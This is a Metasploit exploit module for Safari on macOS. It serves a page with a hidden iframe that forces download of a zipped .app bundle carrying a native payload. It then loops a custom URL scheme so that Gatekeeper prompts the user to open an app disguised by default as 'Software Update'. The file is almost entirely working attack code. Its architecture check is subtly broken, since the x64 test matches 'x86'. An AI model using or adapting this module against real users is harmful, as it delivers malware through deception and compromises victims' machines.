##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Exploit::EXE

  # Note: might be nicer to do this with mounted FTP share, since we can
  # unmount after the attack and not leave a trace on user's machine.
  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Safari User-Assisted Download & Run Attack',
      'Description'    => %q{
        This module abuses some Safari functionality to force the download of a
        zipped .app OSX application containing our payload. The app is then
        invoked using a custom URL scheme. At this point, the user is presented
        with Gatekeeper's prompt:

        "APP_NAME" is an application downloaded from the internet. Are you sure you
        want to open it?

        If the user clicks "Open", the app and its payload are executed.

        You can put newlines & unicode in your APP_NAME, although you must be careful not
        to create a prompt that is too tall, or the user will not be able to click
        the buttons, and will have to either logout or kill the CoreServicesUIAgent
        process.
      },
      'License'        => MSF_LICENSE,
      'Targets'        =>
        [
          [ 'Mac OS X x86 (Native Payload)',
            {
              'Platform' => 'osx',
              'Arch' => ARCH_X86,
            }
          ],
          [ 'Mac OS X x64 (Native Payload)',
            {
              'Platform' => 'osx',
              'Arch' => ARCH_X64,
            }
          ]
        ],
      'DefaultTarget'  => 0,
      'Author'         => [ 'joev <joev[at]metasploit.com>' ]
    ))

    register_options(
      [
        OptString.new('APP_NAME', [false, "The name of the app to display", "Software Update"]),
        OptInt.new('DELAY', [false, "Number of milliseconds to wait before trying to open", 1500]),
        OptBool.new('LOOP', [false, "Continually display prompt until app is run", true]),
        OptString.new('CONTENT', [false, "Content to display in browser", "Redirecting you, please wait..."]),
      ], self.class)
  end

  def on_request_uri(cli, request)
    if request.uri =~ /\.zip/
      print_status("Sending .zip containing app.")
      seed = request.qstring['seed'].to_i
      send_response(cli, app_zip(seed), { 'Content-Type' => 'application/zip' })
    else
      # send initial HTML page
      print_status("Sending #{self.name}")
      send_response_html(cli, generate_html)
    end
    handler(cli)
  end

  def generate_html
    %Q|
    <html><body>
    #{datastore['CONTENT']}
    <iframe id='f' src='about:blank' style='position:fixed;left:-500px;top:-500px;width:1px;height:1px;'>
    </iframe>
    <script>
    (function() {
      var r = parseInt(Math.random() * 9999999);
      var f = document.getElementById('f');
      f.src = "#{datastore['URIPATH']}.zip?seed="+r;
      window.setTimeout(function(){
        var go = function() { f.src = "openurl"+r+"://a"; };
        if (#{datastore['LOOP']}) {
          window.setInterval(go, 100);
        } else {
          go();
        }
      }, #{datastore['DELAY']});
    })();
    </script>
    </body></html>
    |
  end

  def app_zip(seed)
    exe = if x86?
      Msf::Util::EXE.to_osx_x86_macho(framework, payload.encoded, target.opts)
    elsif x64?
      Msf::Util::EXE.to_osx_x64_macho(framework, payload.encoded, target.opts)
    end
    exe_name = Rex::Text.rand_text_alpha(8)
    app_name = "#{datastore['APP_NAME']}.app"
    info_plist = %Q|
      <?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>CFBundleAllowMixedLocalizations</key>
  <true/>
  <key>CFBundleDevelopmentRegion</key>
  <string>English</string>
  <key>CFBundleExecutable</key>
  <string>#{exe_name}</string>
  <key>CFBundleIdentifier</key>
  <string>com.#{exe_name}.app</string>
  <key>CFBundleName</key>
  <string>#{exe_name}</string>
  <key>CFBundlePackageType</key>
  <string>APPL</string>
  <key>CFBundleURLTypes</key>
  <array>
    <dict>
      <key>CFBundleURLName</key>
      <string>Local File</string>
      <key>CFBundleURLSchemes</key>
      <array>
        <string>openurl#{seed}</string>
      </array>
    </dict>
  </array>
</dict>
</plist>
    |

    zip = Rex::Zip::Archive.new
    zip.add_file("#{app_name}/", '')
    zip.add_file("#{app_name}/Contents/", '')
    zip.add_file("#{app_name}/Contents/MacOS/", '')
    zip.add_file("#{app_name}/Contents/Resources/", '')
    zip.add_file("#{app_name}/Contents/MacOS/#{exe_name}", exe)
    zip.add_file("#{app_name}/Contents/Info.plist", info_plist)
    zip.add_file("#{app_name}/Contents/PkgInfo", 'APPLaplt')
    zip.pack
  end

  def x86?; target.name =~ /x86/; end
  def x64?; target.name =~ /x86/; end
end
